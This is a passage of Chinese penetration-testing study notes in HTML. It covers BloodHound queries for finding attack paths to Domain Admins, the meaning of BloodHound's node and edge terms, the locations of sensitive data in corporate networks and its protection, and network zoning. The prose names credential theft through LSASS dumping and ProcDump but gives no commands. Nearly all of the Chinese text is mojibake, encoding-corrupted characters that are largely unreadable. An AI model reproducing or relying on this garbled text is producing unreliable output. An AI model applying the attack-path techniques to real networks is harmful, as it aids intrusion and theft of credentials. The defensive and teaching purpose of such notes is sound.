<li>Shortest Pathsï¼šæœ€çŸ­è·¯å¾„<br>â€” Shortest Paths to Unconstrained Delegation Systemsï¼šåˆ°æ— çº¦æŸå§”æ‰˜ç³»ç»Ÿçš„æœ€çŸ­è·¯å¾„<br>â€” Shortest Paths from Kerberoastable Usersï¼šåˆ°è¾¾Kerberoastableç”¨æˆ·çš„æœ€çŸ­è·¯å¾„<br>â€” Shortest Paths to Domain Admins from Kerberoastable Usersï¼šä»Kerberoastableç”¨æˆ·åˆ°åŸŸç®¡ç†å‘˜çš„æœ€çŸ­è·¯å¾„<br>â€” Shortest Path from Owned Principalsï¼šæ‹¥æœ‰çš„ä¸»ä½“çš„æœ€çŸ­è·¯å¾„<br>â€” Shortest Paths to Domain Admins from Owned Principalsï¼šä»æ‹¥æœ‰çš„ä¸»ä½“åˆ°åŸŸç®¡ç†å‘˜çš„æœ€çŸ­è·¯å¾„<br>â€” Shortest Paths to High Value Targetsï¼šåˆ°é«˜ä»·å€¼ç›®æ ‡çš„æœ€çŸ­è·¯å¾„<br>â€” Shortest Paths from Domain Users to High Value Targetsï¼šä»åŸŸç”¨æˆ·åˆ°é«˜ä»·å€¼ç›®æ ‡çš„æœ€çŸ­è·¯å¾„<br>â€” Find Shortest Paths to Domain Adminsï¼šåˆ°åŸŸç®¡ç†å‘˜çš„æœ€çŸ­è·¯å¾„</li>
<li>Custom Queriesï¼šè‡ªå®šä¹‰æŸ¥è¯¢</li>
</ul>
<p>ç®€å•æµ‹è¯•äº”ä¸ªå¸¸è§çš„æŸ¥è¯¢ï¼š</p>
<p>1ã€æŸ¥æ‰¾æ‰€æœ‰åŸŸç®¡ç†å‘˜</p>
<p>ç‚¹å‡» <code>Find all Domain Admins</code> è¿›è¡ŒæŸ¥è¯¢ã€‚</p>
<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220605223517478.png" alt="image-20220605223517478" style="zoom: 33%;" />

<p>2ã€æŸ¥æ‰¾åˆ°è¾¾åŸŸç®¡ç†å‘˜çš„æœ€çŸ­è·¯å¾„</p>
<p>ç‚¹å‡»<code>Find Shortest Paths to Domain Admins</code> è¿›è¡ŒæŸ¥è¯¢ã€‚</p>
<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220605223734006.png" alt="image-20220605223734006" style="zoom:50%;" />

<p>3ã€æŸ¥çœ‹æŒ‡å®šç”¨æˆ·ä¸åŸŸå…³è”çš„è¯¦ç»†ä¿¡æ¯</p>
<p>â€‹      å•å‡»æŸä¸ªèŠ‚ç‚¹ï¼ŒBloodHound å°†ä½¿ç”¨è¯¥èŠ‚ç‚¹çš„ç›¸å…³ä¿¡æ¯æ¥å¡«å……èŠ‚ç‚¹ä¿¡æ¯é€‰é¡¹å¡ã€‚åœ¨æœ¬èŠ‚çš„å®éªŒä¸­ï¼Œå•å‡»ä»»æ„èŠ‚ç‚¹ï¼Œç„¶åé€‰æ‹©ä¸€ä¸ªç”¨æˆ·åï¼Œå³å¯æŸ¥çœ‹è¯¥ç”¨æˆ·çš„ç”¨æˆ·åã€æ˜¾ç¤ºåã€å¯†ç æœ€åä¿®æ”¹æ—¶é—´ã€æœ€åç™»å½•æ—¶é—´ã€åœ¨å“ªå°è®¡ç®—æœºä¸Šå­˜åœ¨ä¼šè¯ï¼Œä»¥åŠå­˜åœ¨ä¼šè¯çš„è®¡ç®—æœºæ˜¯å¦å¯åŠ¨ã€å±äºå“ªäº›ç»„ã€æ‹¥æœ‰å“ªäº›æœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜æƒé™å’Œè®¿é—®å¯¹è±¡å¯¹æ§åˆ¶æƒé™ç­‰ã€‚BloodHoundèƒ½å¤Ÿä»¥å›¾è¡¨çš„å½¢å¼å°†è¿™äº›ä¿¡æ¯å±•ç¤ºå‡ºæ¥ï¼Œå¹¶åˆ—å‡ºè¯¥ç”¨æˆ·åœ¨åŸŸä¸­çš„æƒé™ï¼Œä»¥ä¾¿Red Teamæˆå‘˜åœ¨åŸŸä¸­è¿›è¡Œæ¨ªå‘æ¸—é€æµ‹è¯•ã€‚</p>
<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220605224232840.png" alt="image-20220605224232840" style="zoom:50%;" />

<p>4ã€æŸ¥çœ‹æŒ‡å®šè®¡ç®—æœºä¸åŸŸçš„å…³ç³»</p>
<p>â€‹      å•å‡»ä»»æ„è®¡ç®—æœºï¼Œå¯ä»¥çœ‹åˆ°è¯¥è®¡ç®—æœºåœ¨åŸŸå†…çš„åç§°ã€ç³»ç»Ÿç‰ˆæœ¬ã€æ˜¯å¦å¯ç”¨ã€æ˜¯å¦å…è®¸æ— çº¦æŸå§”æ‰˜ç­‰ä¿¡æ¯ã€‚</p>
<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220605224411969.png" alt="image-20220605224411969" style="zoom:33%;" />

<p>5ã€å¯»æ‰¾è·¯å¾„</p>
<p>â€‹      å¯»æ‰¾è·¯å¾„çš„æ“ä½œä¸å¯¼èˆªè½¯ä»¶çš„æ“ä½œç±»ä¼¼ã€‚åœ¨ BloodHound ä¸­å•å‡»è·¯å¾„å›¾æ ‡ï¼Œä¼šå¼¹å‡ºç›®æ ‡èŠ‚ç‚¹æ–‡æœ¬æ¡†ã€‚å°†å¼€å§‹èŠ‚ç‚¹å’Œç›®æ ‡èŠ‚ç‚¹åˆ†åˆ«è®¾ç½®<br>ä¸ºä»»æ„ç±»å‹ï¼Œç„¶åå•å‡»ä¸‰è§’å½¢æŒ‰é’®ã€‚å¦‚æœå­˜åœ¨æ­¤ç±»è·¯å¾„ï¼ŒBloodHoundå°†æ‰¾åˆ°æ‰€æœ‰ä»å¼€å§‹èŠ‚ç‚¹åˆ°ç›®æ ‡èŠ‚ç‚¹çš„è·¯å¾„ï¼Œå¹¶åœ¨å›¾å½¢ç»˜åˆ¶åŒºåŸŸå°†è¿™äº›è·¯å¾„æ˜¾ç¤ºå‡ºæ¥ã€‚</p>
<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220605224839565.png" alt="image-20220605224839565" style="zoom:50%;" />

<h3 id="2-15-5-å›¾ä¾‹è¯´æ˜"><a href="#2-15-5-å›¾ä¾‹è¯´æ˜" class="headerlink" title="2.15.5  å›¾ä¾‹è¯´æ˜"></a>2.15.5  å›¾ä¾‹è¯´æ˜</h3><p>1ã€å›¾æ ‡è¯´æ˜</p>
<ul>
<li><p>è“è‰²ä½ç½®å›¾æ ‡æ˜¯<strong>å¼€å§‹èŠ‚ç‚¹</strong> ï¼›</p>
</li>
<li><p>ç™½è‰²éª·é«…å¤´æ˜¯<strong>å·²æ‹¥æœ‰èŠ‚ç‚¹</strong>ï¼›</p>
</li>
<li><p>çº¢è‰²é¶å­å›¾æ ‡æ˜¯<strong>ç›®æ ‡èŠ‚ç‚¹</strong>ï¼›</p>
</li>
<li><p>é’»çŸ³å›¾æ ‡åˆ™æ˜¯<strong>é«˜ä»·å€¼ç›®æ ‡</strong>ï¼›</p>
</li>
</ul>
<p>2ã€èŠ‚ç‚¹è¯´æ˜</p>
<p>â€‹      èŠ‚ç‚¹åˆç»†åˆ†ä¸º6ç§ï¼Œåˆ†åˆ«æ˜¯ <strong>Users</strong> ç”¨æˆ·ã€<strong>Groups</strong> ç»„ã€<strong>Computers</strong> è®¡ç®—æœºã€<strong>Domain</strong> åŸŸã€<strong>GPOs</strong> ç»„ç­–ç•¥å¯¹è±¡ã€<strong>OUs</strong> ç»„ç»‡å•ä½ï¼š</p>
<img src="https://ask.qcloudimg.com/http-save/yehe-5487096/6c63fab3614abd93604eea63c46c2cdb.jpeg" alt="preload" style="zoom:50%;" />

<p>3ã€åè¯è§£é‡Š</p>
<p>â€‹       HasSessionï¼šå½“ç”¨æˆ·ä¸è®¡ç®—æœºæ—¶è¿›è¡Œä¼šè¯æ—¶ï¼Œå‡­æ®ä¼šä¿ç•™åœ¨å†…å­˜ä¸­ï¼Œå¯ç”¨ LSASS æ³¨å…¥æˆ–è€…å‡­æ®è½¬å‚¨æ¥è·å–ç”¨æˆ·å‡­æ®ï¼Œå›¾ä¸­è¯¥ç”¨æˆ·åœ¨ä¸¤å°è®¡ç®—æœºä¸Šå­˜åœ¨ä¼šè¯ï¼š</p>
<img src="https://ask.qcloudimg.com/http-save/yehe-5487096/0e10f009bcea45339e1e36fa168187da.jpeg" alt="preload" style="zoom:50%;" />

<p>â€‹      Contains å¯ä»¥åœ¨OUä¸Šæ·»åŠ ä¸€ä¸ªæ–°çš„ACEï¼Œå®ƒå°†ç»§æ‰¿åˆ°è¯¥OUä¸‹çš„æ‰€æœ‰å­å¯¹è±¡ä¸Šï¼Œæ¯”å¦‚è¯´åœ¨OUä¸Šåº”ç”¨GenericAll ACE ï¼Œé‚£ä¹ˆæ‰€æœ‰å­å¯¹è±¡éƒ½å°†ç»§æ‰¿GenericAllå±æ€§</p>
<p>â€‹      GpLink å°†å…¶è®¾ç½®ä¸ºé“¾æ¥å®¹å™¨ä¸­çš„å¯¹è±¡ã€‚</p>
<h2 id="2-15-æ•æ„Ÿæ•°æ®çš„é˜²æŠ¤"><a href="#2-15-æ•æ„Ÿæ•°æ®çš„é˜²æŠ¤" class="headerlink" title="2.15 æ•æ„Ÿæ•°æ®çš„é˜²æŠ¤"></a>2.15 æ•æ„Ÿæ•°æ®çš„é˜²æŠ¤</h2><p>â€‹        å†…ç½‘çš„æ ¸å¿ƒæ•æ„Ÿæ•°æ®ï¼Œä¸ä»…åŒ…æ‹¬æ•°æ®åº“ã€ç”µå­é‚®ä»¶ï¼Œè¿˜åŒ…æ‹¬ä¸ªäººæ•°æ®åŠç»„ç»‡çš„ä¸šåŠ¡æ•°æ®ã€æŠ€æœ¯æ•°æ®ç­‰ã€‚å¯ä»¥è¯´ï¼Œä»·å€¼è¾ƒé«˜çš„æ•°æ®åŸºæœ¬éƒ½åœ¨å†…ç½‘ä¸­ã€‚å› æ­¤ï¼Œäº†è§£æ”»å‡»è€…çš„æ“ä½œæµç¨‹ï¼Œå¯¹å†…ç½‘æ•°æ®å®‰å…¨é˜²æŠ¤å·¥ä½œè‡³å…³é‡è¦ã€‚</p>
<h3 id="2-15-1èµ„æ–™ã€æ•°æ®ã€æ–‡ä»¶çš„å®šä½æµç¨‹"><a href="#2-15-1èµ„æ–™ã€æ•°æ®ã€æ–‡ä»¶çš„å®šä½æµç¨‹" class="headerlink" title="2.15.1èµ„æ–™ã€æ•°æ®ã€æ–‡ä»¶çš„å®šä½æµç¨‹"></a>2.15.1èµ„æ–™ã€æ•°æ®ã€æ–‡ä»¶çš„å®šä½æµç¨‹</h3><p>â€‹        å†…ç½‘æ•°æ®é˜²æŠ¤çš„ç¬¬ä¸€æ­¥ï¼Œå°±æ˜¯è¦ç†Ÿæ‚‰æ”»å‡»è€…è·å–æ•°æ®çš„æµç¨‹ã€‚åœ¨å®é™…çš„ç½‘ç»œç¯å¢ƒä¸­ï¼Œæ”»å‡»è€…ä¸»è¦é€šè¿‡å„ç§æ¶æ„æ–¹æ³•æ¥å®šä½å…¬å¸å†…éƒ¨å„ç›¸å…³äººå‘˜çš„æœºå™¨ï¼Œä»è€Œè·å¾—èµ„æ–™ã€æ•°æ®ã€æ–‡ä»¶ã€‚å®šä½çš„å¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š</p>
<ul>
<li><p>å®šä½å†…éƒ¨äººäº‹ç»„ç»‡ç»“æ„ã€‚</p>
</li>
<li><p>åœ¨å†…éƒ¨äººäº‹ç»„ç»‡ç»“æ„ä¸­å¯»æ‰¾éœ€è¦ç›‘è§†çš„äººå‘˜ã€‚</p>
</li>
<li><p>å®šä½ç›¸å…³äººå‘˜çš„æœºå™¨ã€‚</p>
</li>
<li><p>ç›‘è§†ç›¸å…³äººå‘˜å­˜æ”¾æ–‡æ¡£çš„ä½ç½®ã€‚</p>
</li>
<li><p>åˆ—å‡ºå­˜æ”¾æ–‡æ¡£çš„æœåŠ¡å™¨çš„ç›®å½•ã€‚</p>
</li>
</ul>
<h3 id="2-15-2-é‡ç‚¹æ ¸å¿ƒä¸šåŠ¡æœºå™¨åŠæ•æ„Ÿä¿¡æ¯é˜²æŠ¤"><a href="#2-15-2-é‡ç‚¹æ ¸å¿ƒä¸šåŠ¡æœºå™¨åŠæ•æ„Ÿä¿¡æ¯é˜²æŠ¤" class="headerlink" title="2.15.2 é‡ç‚¹æ ¸å¿ƒä¸šåŠ¡æœºå™¨åŠæ•æ„Ÿä¿¡æ¯é˜²æŠ¤"></a>2.15.2 é‡ç‚¹æ ¸å¿ƒä¸šåŠ¡æœºå™¨åŠæ•æ„Ÿä¿¡æ¯é˜²æŠ¤</h3><p>é‡ç‚¹æ ¸å¿ƒä¸šåŠ¡æœºå™¨æ˜¯æ”»å‡»è€…æ¯”è¾ƒå…³å¿ƒçš„æœºå™¨ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦å¯¹è¿™äº›æœºå™¨é‡‡å–ç›¸åº”çš„å®‰å…¨é˜²æŠ¤æªæ–½ã€‚</p>
<p>1ã€æ ¸å¿ƒä¸šåŠ¡æœºå™¨</p>
<ul>
<li>é«˜çº§ç®¡ç†äººå‘˜ã€ç³»ç»Ÿç®¡ç†å‘˜ã€è´¢åŠ¡/äººäº‹/ä¸šåŠ¡äººå‘˜çš„ä¸ªäººè®¡ç®—æœºã€‚</li>
<li>äº§å“ç®¡ç†ç³»ç»ŸæœåŠ¡å™¨ã€‚</li>
<li>åŠå…¬ç³»ç»ŸæœåŠ¡å™¨ã€‚</li>
<li>è´¢åŠ¡åº”ç”¨ç³»ç»ŸæœåŠ¡å™¨ã€‚</li>
<li>æ ¸å¿ƒäº§å“æºç æœåŠ¡å™¨ï¼ˆTå…¬å¸é€šå¸¸ä¼šæ¶è®¾è‡ªå·±çš„SVNæˆ–è€…GTæœåŠ¡å™¨)ã€‚</li>
<li>æ•°æ®åº“æœåŠ¡å™¨ã€‚</li>
<li>æ–‡ä»¶æœåŠ¡å™¨ã€å…±äº«æœåŠ¡å™¨ã€‚</li>
<li>ç”µå­é‚®ä»¶æœåŠ¡å™¨ã€‚</li>
<li>ç½‘ç»œç›‘æ§ç³»ç»ŸæœåŠ¡å™¨ã€‚</li>
<li>å…¶ä»–æœåŠ¡å™¨ï¼ˆåˆ†å…¬å¸ã€å·¥å‚ï¼‰ã€‚</li>
</ul>
<p>2ã€æ•æ„Ÿä¿¡æ¯å’Œæ•æ„Ÿæ–‡ä»¶</p>
<ul>
<li>ç«™ç‚¹æºç å¤‡ä»½æ–‡ä»¶ã€æ•°æ®åº“å¤‡ä»½æ–‡ä»¶ç­‰ã€‚</li>
<li>å„ç±»æ•°æ®åº“çš„Webç®¡ç†å…¥å£ï¼Œä¾‹å¦‚phpMyAdminã€Adminerã€‚</li>
<li>æµè§ˆå™¨å¯†ç å’Œæµè§ˆå™¨Cookieã€‚</li>
<li>å…¶ä»–ç”¨æˆ·ä¼šè¯ã€3389å’Œipc$è¿æ¥è®°å½•ã€â€œå›æ”¶ç«™â€ä¸­çš„ä¿¡æ¯ç­‰ã€‚</li>
<li>Windowsæ— çº¿å¯†ç ã€‚</li>
<li>ç½‘ç»œå†…éƒ¨çš„å„ç§è´¦å·å’Œå¯†ç ï¼ŒåŒ…æ‹¬ç”µå­é‚®ç®±ã€VPNã€FTPã€TeamViewç­‰ã€‚</li>
</ul>
<h3 id="2-15-3-åº”ç”¨ä¸æ–‡ä»¶å½¢å¼ä¿¡æ¯çš„é˜²æŠ¤"><a href="#2-15-3-åº”ç”¨ä¸æ–‡ä»¶å½¢å¼ä¿¡æ¯çš„é˜²æŠ¤" class="headerlink" title="2.15.3 åº”ç”¨ä¸æ–‡ä»¶å½¢å¼ä¿¡æ¯çš„é˜²æŠ¤"></a>2.15.3 åº”ç”¨ä¸æ–‡ä»¶å½¢å¼ä¿¡æ¯çš„é˜²æŠ¤</h3><p>â€‹        åœ¨å†…ç½‘ä¸­ï¼Œæ”»å‡»è€…ç»å¸¸ä¼šè¿›è¡ŒåŸºäºåº”ç”¨ä¸æ–‡ä»¶çš„ä¿¡æ¯æ”¶é›†ï¼ŒåŒ…æ‹¬ä¸€äº›åº”ç”¨çš„é…ç½®æ–‡ä»¶ã€æ•æ„Ÿæ–‡ä»¶ã€å¯†ç ã€è¿œç¨‹è¿æ¥ã€å‘˜å·¥è´¦å·ã€ç”µå­é‚®ç®±ç­‰ã€‚ä»æ€»ä½“æ¥çœ‹ï¼Œæ”»å‡»è€…ä¸€æ˜¯è¦äº†è§£å·²æ”»é™·æœºå™¨æ‰€å±äººå‘˜çš„èŒä½ï¼ˆä¸€ä¸ªèŒä½è¾ƒé«˜çš„äººåœ¨å†…ç½‘ä¸­çš„æƒé™é€šå¸¸è¾ƒé«˜ï¼Œåœ¨ä»–çš„è®¡ç®—æœºä¸­ä¼šæœ‰å¾ˆå¤šé‡è¦çš„ã€æ•æ„Ÿçš„ä¸ªäººæˆ–å…¬å¸å†…éƒ¨æ–‡ä»¶)ï¼ŒäºŒæ˜¯è¦åœ¨æœºå™¨ä¸­ä½¿ç”¨ä¸€äº›æœç´¢å‘½ä»¤æ¥å¯»æ‰¾è‡ªå·±éœ€è¦çš„èµ„æ–™ã€‚</p>
<p>â€‹        é’ˆå¯¹æ”»å‡»è€…çš„æ­¤ç±»è¡Œä¸ºï¼Œå»ºè®®ç”¨æˆ·åœ¨å†…ç½‘ä¸­å·¥ä½œæ—¶ï¼Œä¸è¦å°†ç‰¹åˆ«é‡è¦çš„èµ„æ–™å­˜å‚¨åœ¨å…¬å¼€çš„è®¡ç®—æœºä¸­ï¼Œåœ¨å¿…è¦æ—¶åº”å¯¹Officeæ–‡æ¡£è¿›è¡ŒåŠ å¯†ä¸”å¯†ç ä¸èƒ½è¿‡äºç®€å•ï¼ˆå¯¹äºä½ç‰ˆæœ¬çš„Officeè½¯ä»¶ï¼Œä¾‹å¦‚ Office 2003ï¼Œæ”»å‡»è€…åœ¨ç½‘ä¸Šå¾ˆå®¹æ˜“å°±èƒ½æ‰¾åˆ°è½¯ä»¶æ¥ç ´è§£å…¶å¯†ç ï¼›å¯¹äºé«˜ç‰ˆæœ¬çš„Officeè½¯ä»¶ï¼Œæ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡å¾®è½¯SysInternals Suite å¥—ä»¶ä¸­çš„ ProcDump æ¥è·å–å…¶å¯†ç )ã€‚</p>
<h2 id="2-16-åˆ†æå†…ç½‘æ®µåˆ’åˆ†æƒ…å†µä»¥åŠæ‹“æ‰‘ç»“æ„"><a href="#2-16-åˆ†æå†…ç½‘æ®µåˆ’åˆ†æƒ…å†µä»¥åŠæ‹“æ‰‘ç»“æ„" class="headerlink" title="2.16 åˆ†æå†…ç½‘æ®µåˆ’åˆ†æƒ…å†µä»¥åŠæ‹“æ‰‘ç»“æ„"></a>2.16 åˆ†æå†…ç½‘æ®µåˆ’åˆ†æƒ…å†µä»¥åŠæ‹“æ‰‘ç»“æ„</h2><p>â€‹        åœ¨æŒæ¡äº†å†…ç½‘çš„ç›¸å…³ä¿¡æ¯åï¼Œæ¸—é€æµ‹è¯•äººå‘˜å¯ä»¥åˆ†æç›®æ ‡ç½‘ç»œçš„ç»“æ„å’Œå®‰å…¨é˜²å¾¡ç­–ç•¥ï¼Œè·å–ç½‘æ®µä¿¡æ¯ã€å„éƒ¨é—¨çš„Påœ°å€æ®µï¼Œå¹¶å°è¯•ç»˜åˆ¶å†…ç½‘çš„æ‹“æ‰‘ç»“æ„å›¾ã€‚å½“ç„¶ï¼Œæ¸—é€æµ‹è¯•äººå‘˜æ— æ³•äº†è§£å†…ç½‘çš„ç‰©ç†ç»“æ„ï¼Œåªèƒ½ä»å®è§‚ä¸Šå¯¹å†…ç½‘å»ºç«‹ä¸€ä¸ªæ•´ä½“è®¤è¯†ã€‚</p>
<h3 id="2-16-1-åŸºæœ¬æ¶æ„"><a href="#2-16-1-åŸºæœ¬æ¶æ„" class="headerlink" title="2.16.1 åŸºæœ¬æ¶æ„"></a>2.16.1 åŸºæœ¬æ¶æ„</h3><p>â€‹        æ¸—é€æµ‹è¯•äººå‘˜éœ€è¦å¯¹ç›®æ ‡ç½‘ç«™çš„åŸºæœ¬æƒ…å†µè¿›è¡Œç®€å•çš„åˆ¤æ–­ï¼Œåˆ†æç›®æ ‡æœåŠ¡å™¨æ‰€ä½¿ç”¨çš„WebæœåŠ¡å™¨ã€åç«¯è„šæœ¬ã€æ•°æ®åº“ã€ç³»ç»Ÿå¹³å°ç­‰ã€‚<br>ä¸‹é¢åˆ—ä¸¾ä¸€äº›å¸¸è§çš„Webæ¶æ„ï¼š</p>
<ul>
<li><p>ASP+Access+â…¡S 5.0/6.0+Windows Sever 2003</p>
</li>
<li><p>ASPX+MSSQL+IIS 7.0/7.5+Windows Sever 2008</p>
</li>
<li><p>PHP+MySQL+IIS</p>
</li>
<li><p>PHP+MySQL+Apache</p>
</li>
<li><p>PHP+MySQL+Ngnix</p>
</li>
<li><p>JSP+MySQL+Ngnix</p>
</li>
<li><p>JSP+MSSQL+Tomcat</p>
</li>
<li><p>JSP+Oracle+Tomcat</p>
</li>
</ul>
<h3 id="2-16-2-åŸŸå†…ç½‘æ®µåˆ’åˆ†"><a href="#2-16-2-åŸŸå†…ç½‘æ®µåˆ’åˆ†" class="headerlink" title="2.16.2 åŸŸå†…ç½‘æ®µåˆ’åˆ†"></a>2.16.2 åŸŸå†…ç½‘æ®µåˆ’åˆ†</h3><p>â€‹        åœ¨åˆ¤æ–­å†…ç½‘ç¯å¢ƒæ—¶ï¼Œé¦–å…ˆéœ€è¦åˆ†æå†…ç½‘Påœ°å€çš„åˆ†å¸ƒæƒ…å†µã€‚ä¸€èˆ¬å¯ä»¥é€šè¿‡å†…ç½‘ä¸­çš„è·¯ç”±å™¨ã€äº¤æ¢æœºç­‰è®¾å¤‡ï¼Œä»¥åŠSNMPã€å¼±å£ä»¤ç­‰ï¼Œè·å–å†…ç½‘ç½‘ç»œæ‹“æ‰‘æˆ–DNSåŸŸä¼ é€çš„ä¿¡æ¯ã€‚å¤§å‹å…¬å¸é€šå¸¸éƒ½æœ‰å†…éƒ¨ç½‘ç«™ï¼Œå› æ­¤ä¹Ÿå¯é€šè¿‡å†…éƒ¨ç½‘ç«™çš„å…¬å¼€é“¾æ¥æ¥åˆ†æPåœ°å€åˆ†å¸ƒæƒ…å†µã€‚ç½‘æ®µæ˜¯æ€ä¹ˆåˆ’åˆ†çš„ï¼Ÿæ˜¯æŒ‰ç…§éƒ¨é—¨åˆ’åˆ†ç½‘æ®µã€æŒ‰ç…§æ¥¼å±‚åˆ’åˆ†ç½‘æ®µï¼Œè¿˜æ˜¯æŒ‰ç…§åœ°åŒºåˆ’åˆ†ç½‘æ®µï¼Ÿå†…ç½‘é€šå¸¸å¯åˆ†ä¸ºDMZã€åŠå…¬åŒºå’Œæ ¸å¿ƒåŒºï¼ˆç”Ÿäº§åŒº)ã€‚</p>
<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220607123344996.png" alt="image-20220607123344996" style="zoom: 33%;" />



<p><strong>1ã€DMZåŒº</strong></p>
<p>â€‹        DMZ(Demilitarized Zone)éå†›äº‹åŒ–åŒºï¼Œä¹Ÿå°±æ˜¯éš”ç¦»åŒºï¼ŒDMZåŒºæ˜¯ä¸€ä¸ªå¯¹å¤–æœåŠ¡åŒºï¼Œåœ¨DMZåŒºåŸŸä¸­å­˜æ”¾ç€ä¸€äº›å…¬å…±æœåŠ¡å™¨ï¼Œæ¯”å¦‚å¯¹å¤–çš„æœåŠ¡å™¨ã€å¯¹å¤–çš„é‚®ç®±ç­‰ç­‰ã€‚ç”¨æˆ·è¦ä»å¤–ç½‘è®¿é—®åˆ°çš„æœåŠ¡ï¼Œç†è®ºä¸Šéƒ½å¯ä»¥æ”¾åˆ°DMZåŒºã€‚</p>
<p>â€‹        åœ¨å®é™…çš„æ¸—é€æµ‹è¯•ä¸­ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œåœ¨å¤–å›´Webç¯å¢ƒä¸­æ‹¿åˆ°çš„æƒé™éƒ½åœ¨DMZä¸­ã€‚è¿™ä¸ªåŒºåŸŸä¸å±äºä¸¥æ ¼æ„ä¹‰ä¸Šçš„å†…ç½‘ã€‚å¦‚æœè®¿é—®æ§åˆ¶ç­–ç•¥é…ç½®åˆç†ï¼ŒDMZå°±ä¼šå¤„åœ¨ä»å†…ç½‘èƒ½å¤Ÿè®¿é—®DMZè€Œä»DMZè®¿é—®ä¸èƒ½å†…ç½‘çš„çŠ¶æ€ã€‚</p>
<p><strong>2ã€åŠå…¬åŒº</strong></p>
<p>â€‹        åŠå…¬åŒºï¼Œé¡¾åæ€ä¹‰ï¼Œæ˜¯æŒ‡æ—¥å¸¸å·¥ä½œåŒºã€‚åŠå…¬åŒºçš„å®‰å…¨é˜²æŠ¤æ°´å¹³é€šå¸¸ä¸é«˜ï¼ŒåŸºæœ¬çš„é˜²æŠ¤æœºåˆ¶å¤§å¤šä¸ºæ€æ¯’è½¯ä»¶æˆ–ä¸»æœºå…¥ä¾µæ£€æµ‹äº§å“ã€‚åœ¨å®é™…çš„ç½‘ç»œç¯å¢ƒä¸­ï¼Œæ”»å‡»è€…åœ¨è·å–åŠå…¬åŒºçš„æƒé™åï¼Œä¼šåˆ©ç”¨å†…ç½‘ä¿¡ä»»å…³ç³»æ¥æ‰©å¤§æ”»å‡»é¢ã€‚ä¸è¿‡ï¼Œåœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¾ˆå°‘èƒ½å¤Ÿç›´æ¥åˆ°è¾¾åŠå…¬åŒºã€‚æ”»å‡»è€…å¦‚æœæƒ³è¿›å…¥åŠå…¬åŒºï¼Œå¯èƒ½ä¼šä½¿ç”¨é±¼å‰æ”»å‡»ã€æ°´å‘æ”»å‡»æˆ–è€…ç¤¾ä¼šå·¥ç¨‹å­¦ç­‰æ‰‹æ®µã€‚<br>â€‹        åŠå…¬åŒºæŒ‰ç…§ç³»ç»Ÿå¯åˆ†ä¸ºOAç³»ç»Ÿã€é‚®ä»¶ç³»ç»Ÿã€è´¢åŠ¡ç³»ç»Ÿã€æ–‡ä»¶å…±äº«ç³»ç»Ÿã€ä¼ä¸šç‰ˆæ€æ¯’ç³»ç»Ÿã€å†…éƒ¨åº”ç”¨ç›‘æ§ç³»ç»Ÿã€è¿ç»´ç®¡ç†ç³»ç»Ÿç­‰ï¼ŒæŒ‰ç…§ç½‘æ®µå¯åˆ†ä¸ºåŸŸç®¡ç†ç½‘æ®µã€å†…éƒ¨æœåŠ¡å™¨ç³»ç»Ÿç½‘æ®µã€å„éƒ¨é—¨åˆ†åŒºç½‘æ®µç­‰ã€‚</p>
<p><strong>3ã€æ ¸å¿ƒåŒº</strong></p>
<p>â€‹        æ ¸å¿ƒåŒºå†…ä¸€èˆ¬å­˜æ”¾ç€ä¼ä¸šæœ€é‡è¦çš„æ•°æ®ã€æ–‡æ¡£ç­‰ä¿¡æ¯èµ„äº§ï¼ˆä¾‹å¦‚åŸŸæ§åˆ¶å™¨ã€æ ¸å¿ƒç”Ÿäº§æœºå™¨ç­‰)ï¼Œå®‰å…¨è®¾ç½®ä¹Ÿæœ€ä¸ºä¸¥æ ¼ã€‚æ ¹æ®ä¸šåŠ¡çš„ä¸åŒï¼Œç›¸å…³æœåŠ¡å™¨å¯èƒ½å­˜åœ¨äºä¸åŒçš„ç½‘æ®µä¸­ã€‚åœ¨å®é™…ç½‘ç»œç¯å¢ƒä¸­ï¼Œæ”»å‡»è€…é€šè¿‡åˆ†ææœåŠ¡å™¨ä¸Šè¿è¡Œçš„æœåŠ¡å’Œè¿›ç¨‹ï¼Œå°±å¯ä»¥æ¨æ–­å‡ºç›®æ ‡ä¸»æœºä½¿ç”¨çš„è¿ç»´ç›‘æ§ç®¡ç†ç³»ç»Ÿå’Œå®‰å…¨é˜²æŠ¤ç³»ï¼ˆæ”»å‡»è€…åœ¨å†…ç½‘ä¸­è¿›è¡Œæ¨ªå‘æ”»å‡»æ—¶ï¼Œä¼šä¼˜å…ˆæŸ¥æ‰¾è¿™äº›ä¸»æœºï¼‰ã€‚æ ¸å¿ƒåŒºæŒ‰ç…§ç³»ç»Ÿå¯åˆ†ä¸ºä¸šåŠ¡ç³»ç»Ÿã€è¿ç»´ç›‘æ§ç³»ç»Ÿã€å®‰å…¨ç³»ç»Ÿç­‰ï¼ŒæŒ‰ç…§ç½‘æ®µå¯åˆ†ä¸ºä¸šåŠ¡ç½‘æ®µã€è¿ç»´ç›‘æ§ç½‘æ®µã€å®‰å…¨ç®¡ç†ç½‘æ®µç­‰ã€‚</p>
<p>å¤§å‹ä¼ä¸šç½‘ç»œæ¶æ„æœ‰ä¸‰å±‚ï¼šæ¥å…¥å±‚ã€æ±‡èšå±‚ã€æ ¸å¿ƒå±‚ã€‚</p>
<ul>
<li><p>æ¥å…¥å±‚æ¥å…¥ä¸åŒçš„éƒ¨é—¨ï¼Œä¸åŒçš„éƒ¨é—¨å±äºä¸åŒçš„VLANï¼Œä¿è¯äº†ä¸åŒéƒ¨é—¨ä¹‹é—´çš„å®‰å…¨ã€‚</p>
</li>
